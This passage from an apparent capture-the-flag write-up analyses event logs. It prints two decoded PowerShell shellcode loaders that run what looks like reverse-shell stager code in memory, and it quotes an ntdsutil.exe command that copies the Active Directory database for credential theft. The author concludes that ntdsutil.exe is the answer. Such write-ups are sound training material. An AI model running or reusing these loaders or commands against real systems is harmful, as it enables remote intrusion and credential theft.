    [Byte[]]$lrvI = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
            
    $jNet = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lC4 kernel32.dll VirtualAlloc), (wgg @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $lrvI.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($lrvI, 0, $jNet, $lrvI.length)

    $adsHP = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lC4 kernel32.dll CreateThread), (wgg @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$jNet,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lC4 kernel32.dll WaitForSingleObject), (wgg @([IntPtr], [Int32]))).Invoke($adsHP,0xffffffff) | Out-Null
    ```
    6:
    ```powershell
    function uM1F {
        Param ($i46, $zVytt)		
        $vwxWO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        return $vwxWO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vwxWO.GetMethod('GetModuleHandle')).Invoke($null, @($i46)))), $zVytt))
    }

    function nL9 {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $kESi,
            [Parameter(Position = 1)] [Type] $mVd_U = [Void]
        )
        
        $yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $yv.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $kESi).SetImplementationFlags('Runtime, Managed')
        $yv.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mVd_U, $kESi).SetImplementationFlags('Runtime, Managed')
        
        return $yv.CreateType()
    }

    [Byte[]]$dc = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
            
    $oDm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($dc, 0, $oDm, $dc.length)

    $lHZX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null
    ```
    which shows us that all powershell instances actually run the same code which we already decoded above.
1. At this point I became very confused as this is a 2-tree challenge meaning the solution should be very simple. However, metasploit is not the correct answer, veil is not correct, Invoke-Mimikatz is not correct, Mimikatz is not correct, and so forth. net.exe is not correct, net is not correct, I'm at my wits end.
...
...
...
1. My gosh, I missed this:
    ```json
    {
        "command_line": "ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q",
        "event_type": "process",
        "logon_id": 999,
        "parent_process_name": "cmd.exe",
        "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
        "pid": 3556,
        "ppid": 3440,
        "process_name": "ntdsutil.exe",
        "process_path": "C:\\Windows\\System32\\ntdsutil.exe",
        "subtype": "create",
        "timestamp": 132186398470300000,
        "unique_pid": "{7431d376-dee7-5dd3-0000-0010f0c44f00}",
        "unique_ppid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
        "user": "NT AUTHORITY\\SYSTEM",
        "user_domain": "NT AUTHORITY",
        "user_name": "SYSTEM"
    }
    ```
    This is ntdsutil.exe creating a copy of the registry hive... which contains the LSASS creds....
    
    Urghhhhhhhhhh. That was the last line of the file & I had read it like 100x. All the reversing was not needed.
    But we learned a lot! Remember, if it's 2/5 difficulty, look for _easier_ stuff. Like *_seriously_*.
    And the answer is ntdsutil.exe...

    All we get out of it is more narrative :D